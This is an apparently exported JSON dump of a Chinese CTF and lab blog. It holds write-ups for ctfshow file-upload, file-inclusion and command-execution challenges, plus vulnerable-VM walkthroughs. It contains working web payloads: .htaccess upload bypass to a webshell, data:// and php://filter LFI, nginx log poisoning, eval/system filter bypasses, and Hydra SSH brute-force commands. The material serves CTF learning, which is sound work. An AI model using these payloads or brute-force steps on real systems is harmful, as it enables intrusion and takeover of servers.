Apache，于是就利用.htaccess来getshell。 先直接上传一个.htaccess文件记住不能.前面不能加任何字符 12345FilesMatch &quot;2.jpg&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后send to repeater,send发现文件上传成功，记住FIlewatch后面跟的是文件名，如果你要上传的filename包含这个文件名，则会以PHP的形式上传。 然后进行上传2.jpg文件，里面是一句话木马,上蚁剑便可以获取，重点是一句话代码与上一行应有一行的空格。不然就不对了 拓展知识htaccess文件是一个用于Apache Web服务器的配置文件。它允许您在不修改主服务器配置文件的情况下，对单个目录（及其子目录）进行配置。这种方式使得网站管理员可以对特定目录应用特定的设置，例如URL重写、访问控制、MIME类型等。 主要功能包括： 重定向和URL重写：可以将旧的URL重定向到新的URL，或者实现更友好的URL结构。 访问控制：可以限制特定IP地址或用户代理访问网站，或者要求用户提供用户名和密码才能访问某些目录。 自定义错误页面：可以为特定的HTTP错误代码（如404页面未找到）设置自定义错误页面。 MIME类型：可以为特定文件扩展名定义MIME类型，以便正确地传输文件内容。 [LitCTF 2023]作业管理系统(文件上传，弱口令) Ctrl+u查看源代码，发现用户名和密码 上传一句话木马文件 上传成功，显示木马文件路径 用蚁剑连接 查找flag","categories":[{"name":"ctfshow-web-文件上传","slug":"ctfshow-web-文件上传","permalink":"http://example.com/categories/ctfshow-web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://example.com/tags/NSSCTF/"},{"name":"web文件上传","slug":"web文件上传","permalink":"http://example.com/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"文件包含-web78","slug":"文件包含-web78","date":"2025-07-31T01:30:54.662Z","updated":"2025-10-25T07:58:38.941Z","comments":true,"path":"2025/07/31/文件包含-web78/","permalink":"http://example.com/2025/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-web78/","excerpt":"","text":"web78 本题没有过滤，所以有三种方法： 法一：data伪协议data伪协议（推荐，可以使用ls命令查看flag位置） 1?file=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt; //获取当前目录文件发现有一个flag.php 1?file=data://text/plain,&lt;?php system(&quot;tac flag.php&quot;)?&gt; //读取flag.php的中的内容。 拓展知识 data:// 协议： 这是一种 PHP 支持的流封装协议，可以直接在 URI 中包含数据，例如： 1?file=data://text/plain,&lt;?php echo &quot;test&quot;; ?&gt; text/plain 是一种 MIME 类型（媒体类型），用于表示纯文本内容，不包含任何格式或特殊结构（如 HTML、XML、JSON 等）。 MIME（Multipurpose Internet Mail Extensions）类型用于标识文件或数据的格式，常见的有： text/plain → 纯文本（如 .txt 文件） text/html → HTML 网页 application/json → JSON 数据 image/jpeg → JPEG 图片 application/octet-stream → 二进制数据 法二：fliter伪协议fliter伪协议（不推荐，不知道flag在哪时不好用） 一种 PHP 文件包含（LFI）漏洞利用技术，目的是读取服务器上的 flag.php 文件内容，并以 Base64 编码方式返回，避免直接执行 PHP 代码。 1?file=php://filter/convert.base64-encode/resource=flag.php 拓展知识 php://filter 协议PHP 提供了一种特殊协议 php://filter，可以对数据进行流过滤处理，例如： convert.base64-encode → 将文件内容转换为 Base64 编码（避免直接执行 PHP 代码）。 string.rot13 → 对内容进行 ROT13 编码（较少用于攻击）。 zlib.deflate → 压缩数据。 法三：日志注入+ua添加木马1?file=/var/log/nginx/access.log 1?file=/var/log/nginx/access.log&amp;1=system(&quot;ls *.php&quot;); 1?file=/var/log/nginx/access.log&amp;1=system(&quot;tac flag.php&quot;); web79 法一：data:&#x2F;&#x2F; 协议 + Base64 编码屏蔽了php，这次考虑data伪协议payload1：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;p1使用了大小写绕过，system里的php不会被过滤payload2：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;p2 注意data协议使用base64编码时text&#x2F;plain后面为； 1查看目录：?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4= 1获取flag： ?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4= 1?file=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt; //可以获取当前目录文件发现有一个flag.php 1?file=data://text/plain,&lt;?=system(&#x27;tac flag*&#x27;);?&gt; //即可读取flag.php的中的内容。 拓展知识 1234567&lt;?php ?&gt; :php默认的开始、结束标签 &lt;? ?&gt; :需要开启short_open_tag ，即short_open_tag = On。 &lt;%%&gt; :需要开启asp_tags ，即asp_tags = On。 &lt;?= ?&gt; :用于输出，等同于- 可以直接使用&lt;%= %&gt; :用于输出，等同于- ，需要开启asp_tags ，才可以使用 short_open_tag控制的是&lt;? ?&gt;标签。而并非&lt;?= ?&gt;标签，&lt;?= ?&gt;标签用于输出变量。当开启short_open_tag，&lt;? ?&gt; 功能和&lt;?php ?&gt; 一样。 没有分号 ; 但仍然可以执行，这是因为：1. PHP 的“结束标记 ?&gt; 隐含分号”规则 如果 PHP 代码的最后一行是 纯 PHP 代码（没有 HTML 混合），并且以 ?&gt; 结尾，那么 PHP 解析器会自动在 ?&gt; 前补充分号 ;。 所以： 123&lt;?phpsystem(&quot;tac flag.php&quot;) // 没有分号?&gt; // 但 PHP 会自动补全 `;` 等效于： 123&lt;?phpsystem(&quot;tac flag.php&quot;); // 解析器自动补全分号?&gt; 2. 什么情况下必须加分号？ 如果后面还有 PHP 代码，则必须加分号： 1234&lt;?phpsystem(&quot;tac flag.php&quot;) // ❌ 错误，缺少分号echo &quot;Done&quot;; // 这行会报错?&gt; 正确写法： 1234&lt;?phpsystem(&quot;tac flag.php&quot;); // ✅ 必须加分号echo &quot;Done&quot;;?&gt; 如果 PHP 代码后面没有 ?&gt;（比如纯 PHP 文件），最后一行可以省略分号： 12&lt;?phpsystem(&quot;tac flag.php&quot;) // ✅ 文件末尾可省略分号 （但建议始终加上，避免意外错误。） 3. 为什么 CTF &#x2F; 渗透测试中经常看到无分号的写法？ 缩短 Payload：在 URL 或注入攻击中，减少字符数可以绕过某些限制。 利用 PHP 的容错性：PHP 对语法要求较宽松，某些情况下即使不规范也能执行。 法二：日志注入+ua添加木马1?file=/var/log/nginx/access.log 1?file=/var/log/nginx/access.log&amp;1=system(&quot;ls *.php&quot;); 1?file=/var/log/nginx/access.log&amp;1=system(&quot;tac flag.php&quot;); web80 法一：日志注入+ua添加木马（推荐，伟大无需多言）本关过滤了php和data应该是不允许使用伪协议，但是可以正常包含，采用包含日志文件的方式。 日志文件中包含了 url以及ua信息等，这里ua最容易控制，抓包改ua，写入一句话即可。如下第三行添加 直接命令执行（寻找PHPinfo信息前面的那一段信息即可找到） 1?file=/var/log/nginx/access.log&amp;2=system(&#x27;ls /var/www/html&#x27;);phpinfo(); 1?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo(); 用webshell后门工具连接 法二：bp抓包+POST方法对于php 和data 已经被过滤掉了，所以都不能用， 但是用POST 的方法，还能用，为了不被过滤，php:&#x2F;&#x2F;input 改成PHP:&#x2F;&#x2F;input GET 方法改为POST方法 最后添加一行，内容是需要包含的php代码 。这里目的是为了执行第一次，执行为： 结果 显示 有2个文件 ，一是fl0g.php 另一个是index.php 再来一次，这次直接显示 fl0g.php 这时可显示出fl0g.php 的内容 了。 web81日志注入+ua添加木马 在响应头中可以看到服务器为 nginx 包含 nginx 访问日志记录 1?file=/var/log/nginx/access.log 修改UA信息 以下命令不能在bp上直接改，所以去浏览器里面访问即可 1?file=/var/log/nginx/access.log&amp;1=system(&quot;ls *.php&quot;); 1?file=/var/log/nginx/access.log&amp;1=system(&quot;tac fl0g.php&quot;); 总结日志注入+ua添加木马（推荐，都适用，条件：在响应头中可以看到服务器为 nginx）12345?file=/var/log/nginx/access.log //进入日志，抓包，添加木马?file=/var/log/nginx/access.log&amp;1=system(&quot;ls *.php&quot;); //浏览器查看?file=/var/log/nginx/access.log&amp;1=system(&quot;tac flag.php&quot;); //浏览器查看","categories":[{"name":"ctfshow-web-文件包含","slug":"ctfshow-web-文件包含","permalink":"http://example.com/categories/ctfshow-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"web文件包含","slug":"web文件包含","permalink":"http://example.com/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"日志注入+ua添加木马","slug":"日志注入-ua添加木马","permalink":"http://example.com/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/"}]},{"title":"爆破-web29","slug":"命令执行-web29","date":"2025-07-29T09:11:19.052Z","updated":"2025-07-31T02:45:09.640Z","comments":true,"path":"2025/07/29/命令执行-web29/","permalink":"http://example.com/2025/07/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29/","excerpt":"","text":"web29 典型的 Web Shell 或代码执行漏洞 的示例代码功能解析 error_reporting(0) 关闭所有 PHP 错误提示，防止泄露敏感信息。 if(isset($_GET[‘c’])) 检查是否存在 GET 参数 c（例如：?c&#x3D;命令）。 preg_match(“&#x2F;flag&#x2F;i”, $c) 使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。 preg_match: 正则匹配 i:是正则匹配中的一个修饰符，表示不区分大小写。 eval($c) 执行 $c中的 PHP 代码，这是**高危操作**，允许攻击者执行任意代码。 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。 highlight_file(FILE) 如果没有传递 c 参数，则高亮显示当前文件的源代码。 漏洞利用方式直接执行系统命令 通过 system()函数执行命令： 12345?c=system(&quot;ls&quot;); // 列目录?c=system(&quot;cat fla*.php&quot;); // flag.php在代码中被过滤掉了，所以需要使用模糊绕过 fla*.php 绕过代码过滤?c=system(&quot;tac fla*.php&quot;); 目前觉得因为system的参数必须是string，所以用引号包裹。因为是以php代码形式来执行的，所以结尾必须有分号。 在 Linux&#x2F;Unix 系统中，tac是一个命令行工具，它与 cat类似，但会反向输出文件内容（即从最后一行到第一行）。 为什么在 CTF 中用 tac？ 绕过防御规则 某些题目可能会监控或过滤 cat命令，但未过滤 tac。 例如：?c&#x3D;system(“tac fl*”);可能绕过 preg_match(“&#x2F;cat&#x2F;i”, $c)的检测。 快速查看文件末尾 如果 flag在文件末尾（如日志文件），tac可以直接看到，无需滚动屏幕。 3.如果 tac 被禁用，可以尝试其他方法（如 less、more、head、tail等）。 操作1.?c&#x3D;system(“ls”); 2.?c&#x3D;system(“tac fla*.php”); 3.?c&#x3D;system(“cat fla*.php”); 4.蚁剑1url?c=eval($_POST[222]); web30 123456789?c=passthru(&quot;tac fla*&quot;);?c=echo `tac fla*`;?c=$a=sys;$b=tem;$c=$a.$b;$c(&quot;tac fla*&quot;);?c=echo shell_exec(&quot;tac fla*&quot;);?c=eval($_GET[1]);&amp;1=system(&quot;tac flag.php&quot;); 1. passthru(&quot;tac fla\\*&quot;)1?c=passthru(&quot;tac fla*&quot;); 功能：直接执行系统命令 tac fla* 并原始输出结果（适合二进制或非文本数据）。 特点： 类似 system()，但直接输出到浏览器，无需 echo。 如果 passthru 未被过滤，是高效的选择。 绕过场景： 过滤了 system 但未过滤 passthru。 2. 反引号执行命令1?c=echo `tac fla*`; 功能：反引号 &#96;&#96;&#96; 是 shell_exec() 的简写，执行命令并返回输出。 特点： 需配合 echo 显示结果。 反引号可能在过滤规则中被忽略（尤其是简单正则）。 绕过场景： 过滤了函数名（如 system、shell_exec），但未过滤反引号。 3. 字符串拼接函数名1?c=$a=sys;$b=tem;$c=$a.$b;$c(&quot;tac fla*&quot;); 功能：通过拼接 sys + tem 动态生成 system 函数名。 特点： 绕过对完整函数名的黑名单过滤。 依赖 PHP 的变量解析特性。 绕过场景： 过滤了 system 但允许动态变量调用。 4. shell_exec + echo1?c=echo shell_exec(&quot;tac fla*&quot;);//注意shell_exec必须配合echo使用 功能：通过 shell_exec 执行命令并显式输出。 特点： 必须用 echo 显示结果（shell_exec 默认不输出）。 比 system 更隐蔽，适合无回显场景。 绕过场景： 过滤了 system 但未过滤 shell_exec。 5. eval 动态执行 GET 参数1?c=eval($_GET[1]);&amp;1=system(&quot;tac flag.php&quot;); 功能：利用 eval 执行另一个 GET 参数中的代码。 特点： 高度灵活，可嵌套多层绕过。 依赖 eval 未被禁用。 绕过场景： 需要绕过对直接命令执行的过滤时（如 system 被过滤，但 eval 可用）。 综合对比与推荐 方法 优势 限制 适用场景 passthru 直接输出，无需 echo 可能被过滤 需要快速显示二进制数据 反引号 语法简单，易绕过过滤 需 echo 过滤了函数名但未过滤反引号 字符串拼接 绕过静态函数名过滤 依赖 PHP 变量解析 黑名单过滤严格时 shell_exec 隐蔽性强 需echo显式输出 无回显或需要结果处理 eval + 参数 高度灵活 需 eval 可用 多层绕过复杂过滤 web31 空格可以使用${IFS}代替 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac flag.php”); web32 文件包含过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了，但是php中也有不需要括号的函数，如： 1234567echo 123;print 123;die;include &quot;/etc/passwd&quot;;require &quot;/etc/passwd&quot;;include_once &quot;/etc/passwd&quot;;require_once &quot;etc/passwd&quot;; 这里我们利用include构造payload 1url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php 其中?&gt;代替分号，后面的?&gt;的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。 页面显示flag.php内容的base64编码，解码即可获取flag 日志注入1url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可","categories":[{"name":"ctfshow-web-命令执行","slug":"ctfshow-web-命令执行","permalink":"http://example.com/categories/ctfshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"web命令执行","slug":"web命令执行","permalink":"http://example.com/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"爆破-web21-25","slug":"爆破-web21-25","date":"2025-07-27T12:21:47.675Z","updated":"2025-07-31T04:23:58.324Z","comments":true,"path":"2025/07/27/爆破-web21-25/","permalink":"http://example.com/2025/07/27/%E7%88%86%E7%A0%B4-web21-25/","excerpt":"","text":"web21 以上是题目给的已知条件，因为题目只给了后台的密码字典，猜测后台用户名就是admin，接下来就用bp抓包用字典来爆破密码了bp抓包 用题目给的密码字典爆破1.payload位置设置 2.payload设置 3.攻击，看长度，长度跟其他不一样的一般就是这个 4.查看最终效果即可得到flag 其实一开始就可以从题目给的密码字典打开一看就可以看出密码就是shark63，因为它跟其他密码不一样，最特别 web22 web23 要求找到一个特定的token值，使得其MD5哈希值满足某些条件才能获取flag 代码分析 获取token参数 12if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); 用户通过?token=xxx传入一个值，程序会计算其MD5哈希值（32位十六进制字符串）。 第一个条件 1if(substr($token, 1,1) === substr($token, 14,1) &amp;&amp; substr($token, 14,1) === substr($token, 17,1))&#123; 要求token的MD5哈希值的第2、15、18位字符相同（PHP的substr索引从0开始）。 例如：token[1] &#x3D;&#x3D; token[14] &#x3D;&#x3D; token[17] 第二个条件 1if((intval(substr($token, 1,1)) + intval(substr($token, 14,1)) + substr($token, 17,1)) / substr($token, 1,1) === intval(substr($token, 31,1)))&#123; 将第2、15、18位的字符转换为整数（intval会忽略非数字字符，如a-f会转为0）。 计算 (第2位 + 第15位 + 第18位) &#x2F; 第2位，结果必须等于第32位的字符的整数值。 由于第2、15、18位相同，简化为：(3 * x) &#x2F; x &#x3D; 3，因此第32位字符必须是3。 暴力破解token： 编写脚本枚举可能的token值，计算其MD5哈希，检查是否满足上述条件。 由于MD5不可逆，只能通过穷举尝试。 法一：脚本爆破Python爆破脚本示例11234567891011121314151617import hashlibdef find_token(): for i in range(0, 100000000): # 枚举范围根据需要调整 token = str(i) md5 = hashlib.md5(token.encode()).hexdigest() # 检查第2、15、18位是否相同且为数字 if md5[1] == md5[14] == md5[17] and md5[1].isdigit(): x = int(md5[1]) # 检查第32位是否为3 if md5[31] == &#x27;3&#x27;: print(f&quot;Found token: &#123;token&#125;&quot;) print(f&quot;MD5: &#123;md5&#125;&quot;) return token return Nonefind_token() Python爆破脚本示例2(别人的)123456789101112131415161718192021222324252627import itertoolsimport hashlibimport stringdef md5(s): if type(s) != bytes: s = bytes(s, encoding=&quot;utf-8&quot;) hash_md5 = hashlib.md5() hash_md5.update(s) return hash_md5.hexdigest()def web23(): dir = string.digits + string.ascii_uppercase + string.ascii_lowercase # 这里我不知道多少位能满足需求，所以写成变量，如果1-3位跑不出来，我可以跑更多位的 for i in range(1, 4): for comb in itertools.combinations_with_replacement(dir, i): str_comb = &quot;&quot;.join(comb) v_md5 = md5(str_comb) if v_md5[1] == v_md5[14] == v_md5[17]: try: # 除零异常，字符串无法转int异常，我懒得处理了，统统忽略就行了 if ((int(v_md5[1])+int(v_md5[14])+int(v_md5[17]))/int(v_md5[1])==int(v_md5[31])): print(str_comb) print(v_md5[1], v_md5[14], v_md5[17]) except: passif __name__ == &#x27;__main__&#x27;: web23() php(别人的) 法二：fuzz(下面的字典是结合脚本跑出来的结果的值) web24 目标是传入一个参数r，使其值与服务器生成的mt_rand()值相等，从而获取flag。 代码分析 设置随机数种子 1mt_srand(372619038); // 固定种子 mt_srand()用固定种子（372619038）初始化Mersenne Twister伪随机数生成器，因此后续的mt_rand()输出是可预测的。 检查参数r 123if(intval($r) === intval(mt_rand()))&#123; echo $flag;&#125; 用户通过?r&#x3D;xxx传入的值（转为整数后）必须等于mt_rand()的下一个输出值（也转为整数）。 系统信息泄露 1echo system(&#x27;cat /proc/version&#x27;); 输出Linux内核版本（5.4.0-163-generic），但此信息对解题无直接影响。 解题原理 PHP的mt_rand()在种子固定时，生成的序列是确定的。 若知道种子（这里是372619038），可以本地复现相同的随机数序列。 解题步骤 本地复现mt_rand()输出在相同PHP环境下（相同版本），用相同种子调用mt_rand()，获取第一个值： 12mt_srand(372619038);echo mt_rand(); // 输出：1155388967 法一：本地php 法二：在线php沙盒 构造Payload传入r&#x3D;1155388967即可满足条件： 法一：URL1https://210d0c32-c987-4696-8b79-600530e82849.challenge.ctf.show/?r=1155388967 法二：bp 扩展知识本地计算mt_rand()的第一个值（1155388967）是怎么计算的？在PHP中，当使用 mt_srand()设置固定种子后，mt_rand()生成的随机数序列是确定的（伪随机）。因此，只要知道种子值，就可以在本地复现相同的随机数序列。 方法1：在本地使用相同的PHP环境运行代码方法2：使用Python的 random模块模拟PHP的mt_rand()方法3：使用在线PHP沙盒1234&lt;?phpmt_srand(372619038);echo mt_rand();?&gt; web25 涉及 mt_srand()和 mt_rand() 的可预测性问题。目标是构造一个 r 参数和 token Cookie，使得服务器返回 flag 代码分析1. 种子生成1mt_srand(hexdec(substr(md5($flag), 0, 8))); md5($flag)：计算 flag 的MD5哈希（32位十六进制字符串）。 substr(md5($flag), 0, 8)：取前8位（如 5d41402a）。 hexdec()：将8位十六进制字符串转为十进制整数（如 5d41402a→ 1564567594）。 mt_srand()：用这个整数作为种子初始化伪随机数生成器。 2. 检查 r 参数123456$rand = intval($r) - intval(mt_rand());if ((!$rand)) &#123; // 即 $r == mt_rand() if ($_COOKIE[&#x27;token&#x27;] == (mt_rand() + mt_rand())) &#123; echo $flag; &#125;&#125; $r 必须等于第一个 mt_rand()的值。 token Cookie 必须等于后续两个 mt_rand()的和。 分析上述代码，可知需要进入到打印flag的分支，需要满足$rand0&#x3D;0，即$r等于第1次的mt_rand()值，同时需要满足token值等于第2次mt_rand()值与第3次mt_rand()值的和，由于mr_srand()的seed值不变，可由第一次的mt_rand()值反推mr_srand()的seed值。 解题思路由于种子未知，我们需要利用 echo $rand 信息泄漏来推断种子和随机数序列。 步骤1：获取第一个 mt_rand()的值 发送 ?r&#x3D;0： 服务器计算 $rand &#x3D; 0 - mt_rand()。 返回 -mt_rand()的值（如 -123456789）。 因此，第一个 mt_rand() &#x3D; -($rand)。 步骤2：推断种子php_mt_seed工具1用于通过已知的伪随机数序列反推出 PHP 的mt_rand() 函数的种子值。 下载工具https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz1.进入存放压缩包目录并解压缩：tar -zxvf php_mt_seed-4.0.tar.gz 2.赋予权限：chmod 777 php_mt_seed.c 3.执行：.&#x2F;php_mt_seed 第一次种子生成数 因为容器关闭了重新开了一个 4.操作法一：hackbar(如果没有回显就去浏览器里面把cookies的缓存删掉再重新进入即可) 法二：bp(注意cookie的存放位置，否则回显不了)","categories":[{"name":"ctfshow-web-爆破","slug":"ctfshow-web-爆破","permalink":"http://example.com/categories/ctfshow-web-%E7%88%86%E7%A0%B4/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"web爆破","slug":"web爆破","permalink":"http://example.com/tags/web%E7%88%86%E7%A0%B4/"}]},{"title":"low easyaspie","slug":"vulnvm low easyaspie","date":"2025-07-27T08:50:18.000Z","updated":"2025-07-27T09:34:00.293Z","comments":true,"path":"2025/07/27/vulnvm low easyaspie/","permalink":"http://example.com/2025/07/27/vulnvm%20low%20easyaspie/","excerpt":"","text":"打这些靶机的最终的目标就是拿到root权限就OK了先把自己的kali跟目标靶机的设置都保持是NAT模式(NAT—独立的一个域 桥接–虚拟机跟本机是同一网段)，反正就是要么全都是NAT，要么全都是桥接模式 信息收集查看自己kali里面的IP—-ifconfig 用nmap扫网段确定目标靶机的IP—nmap 192.168.196.0&#x2F;24 大概确定目标靶机的IP是192.168.196.143 再用nmap -A -sV 192.168.196.143仔细查找这个目标靶机的信息 然后看到开放22(ssh)跟80(http)端口(感觉没什么用) 然后就扫目录—dirsearch -u 192.168.196.143,发现这个扫不出来 然后采用另外一种扫目录的方式–gobuster dirgobuster dir -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -u http://192.168.196.143/ -x.php,.txt,.html 一般kali里面会自带字典,所以我们只需要查找它的路径即可 12updatedb # 先更新数据库（如果第一次运行）locate directory-list-2.3-medium.txt 12查找到字典的路径:/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt Gobuster 进行目录爆破扫描的，下面是对每个部分的详细解析： 命令结构bash 1gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.196.143/ -x .php,.txt,.html 1. gobuster dir 作用：使用 Gobuster 的 dir 模式（目录&#x2F;路径爆破）。 替代模式： dns：DNS 子域名爆破 vhost：虚拟主机枚举 2. -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -w（或 --wordlist）：指定字典文件路径。 字典文件： /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 是 DirBuster 默认提供的字典（Kali Linux 自带）。 包含常见的 Web 目录和文件名（如 admin、login.php、backup 等）。 其他常用字典： /usr/share/seclists/Discovery/Web-Content/common.txt（更精简） /usr/share/wordlists/dirb/common.txt（DIRB 的字典） 3. -u http://192.168.196.143/ -u（或 --url）：指定目标 URL。 格式要求： 必须以 http:// 或 https:// 开头。 末尾的 / 可加可不加（Gobuster 会自动处理）。 示例： http://192.168.196.143（扫描根目录） http://192.168.196.143/admin/（扫描特定目录） 4. -x .php,.txt,.html -x（或 --extensions）：指定要检查的文件扩展名。 作用： 不仅扫描目录（如 /admin/），还会尝试组合字典 + 扩展名（如 index.php、robots.txt）。 注意事项： 扩展名不需要 .（新版 Gobuster 可以写成 php,txt,html）。 如果漏掉 -x，默认只扫描目录，不检查文件。 完整命令示例1gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.196.143 -x php,txt,html -t 50 爆破扫描到了一个正常打开的网页note.txt文件，方式一：可以在浏览器里面登录查看这个note.txt文件 方式二：可以在kali终端里面输入查看网页指令—curl http://192.168.196.143/note.txt Hydra 进行 SSH 暴力破解使用 Hydra 进行 SSH 暴力破解，下面是对每个参数的详细解析： 完整命令 1hydra -l alex -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.196.143 -V -I -e nsr -t 4 hydra作用：调用 Hydra 工具（用于网络登录暴力破解）。 -l alex-l（小写 L）：指定目标用户名（alex）。 -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz-P（大写 P）：指定密码字典文件（rockyou.txt.gz）。 查找密码文件的路径 示例： -P passwords.txt（从字典爆破） -p 123456（测试单个密码） ssh:&#x2F;&#x2F;192.168.196.143协议 &amp; 目标：指定攻击目标（192.168.3.123）和协议（SSH）。 Hydra 支持的协议： ssh:&#x2F;&#x2F;（SSH 登录） ftp:&#x2F;&#x2F;（FTP 登录） http-post-form:&#x2F;&#x2F;（HTTP POST 表单爆破） rdp:&#x2F;&#x2F;（远程桌面爆破） 示例： 1ftp://192.168.196.143 1http-post-form://example.com/login.php:user=^USER^&amp;pass=^PASS^:Invalid -V-V（Verbose 模式）： 显示详细的破解过程（实时输出尝试的用户名&#x2F;密码组合）。 如果不加 -V，Hydra 只会在成功时显示结果。 -I-I（立即模式）： 跳过初始连接测试，直接开始爆破（适用于已知目标存活的情况）。 如果不加 -I，Hydra 会先检查目标是否在线。 -e nsr-e（额外检查选项）： n：尝试空密码（alex:）。 s：尝试用户名作为密码（alex:alex）。 r：尝试反向密码（alex:xela）。 示例： -e n（仅测试空密码） -e ns（测试空密码 + 用户名作为密码） 完整命令解析 1hydra -l alex -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.196.143 -V -I -e nsr -t 4 含义： 对 192.168.196.143 的 SSH 服务进行爆破。 用户名：alex（固定）。 密码字典：rockyou.txt.gz（密码文件）。 额外测试： 空密码（alex:）。 用户名作为密码（alex:alex）。 反向用户名密码（alex:xela）。 实时显示爆破过程（-V）。 跳过初始连接测试（-I）。 破解速度慢增加线程数（-t，默认 16）：如果目标有 防爆破机制（如 Fail2Ban），降低线程数 完整命令 1hydra -l alex -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.196.143 -V -I -e nsr -t 4 ssh远程连接命令通过 SSH（Secure Shell） 连接到远程 Linux 服务器的基本用法 命令结构1ssh alex@192.168.196.143(默认端口是22的时候，如果不是的话就要添加端口号) 1. ssh 作用：调用 SSH 客户端，用于安全远程登录 Linux&#x2F;Unix 服务器。 替代工具： scp（安全文件传输） sftp（安全 FTP） 2. alex 作用：指定远程服务器的 用户名（这里是 alex）。 如果省略，SSH 会默认使用当前本地用户名尝试登录： 1ssh 192.168.196.143 # 默认使用本地用户名（如 kali）登录 3. @ 作用：分隔用户名和主机地址（固定语法）。 4. 192.168.196.143 作用：目标服务器的 IP 地址 或 域名。 示例： 12ssh alex@example.com # 使用域名ssh alex@192.168.196.143 -p 2222 # 指定非默认端口（2222） ssh alex@192.168.196.143执行后的流程 首次连接： 如果目标服务器是第一次访问，SSH 会提示确认指纹（输入 yes 即可) 2.输入密码： 输入用户 alex 的密码（不会显示，直接盲输后按回车）。 登录成功： 进入远程服务器的 Shell，命令行提示符会变成 alex@hostname:~$。 1ls -al 是 Linux&#x2F;Unix 系统中用于 列出当前目录下所有文件和目录（包括隐藏文件） 的常用命令，并显示 详细信息。 sudo -l –查看当前用户被允许执行的 sudo 权限的命令有哪些 1sudo -l 是 Linux&#x2F;Unix 系统中用于查看当前用户被允许执行的 sudo 权限的命令。它可以帮助你了解哪些命令可以被当前用户以 sudo（超级用户权限）运行，而无需切换到 root 用户。 sudo bash –用于以root 权限启动一个新的 Bash Shell1sudo bash 是一个 Linux&#x2F;Unix 命令，用于以root 权限启动一个新的 Bash Shell。sudo：以超级用户（root）权限执行后续命令。bash：启动一个新的 Bash Shell（Linux 默认的命令行解释器）。执行效果 输入密码：执行后会提示输入 当前用户的密码（不是 root 密码，除非配置了 NOPASSWD）。(注意这个靶机应该没有设置root登录的密码) 进入 root Shell：成功后，命令行提示符会变成 root@hostname:~#，表示当前会话拥有最高权限。 用途1. 提权（渗透测试场景）2. 临时获取 root 权限3. 脚本中以 root 身份运行","categories":[{"name":"Vulnvm靶机复现","slug":"Vulnvm靶机复现","permalink":"http://example.com/categories/Vulnvm%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Vulnvm","slug":"Vulnvm","permalink":"http://example.com/tags/Vulnvm/"}]},{"title":"DC-2","slug":"DC-2","date":"2025-07-27T07:50:18.000Z","updated":"2025-11-01T07:45:09.365Z","comments":true,"path":"2025/07/27/DC-2/","permalink":"http://example.com/2025/07/27/DC-2/","excerpt":"","text":"总结出一个点：靶机给出的所有信息都是有用的信息，当没有思路的时候就去看前面得到的信息哪些还没有用，说不定这些信息就是另外的解题思路了nmap -p IP -A 是加-A直接查询更加详细的IP端口的作用 22端口原本是ssh的，但是这里是7744端口说明对方更改了端口映射关系 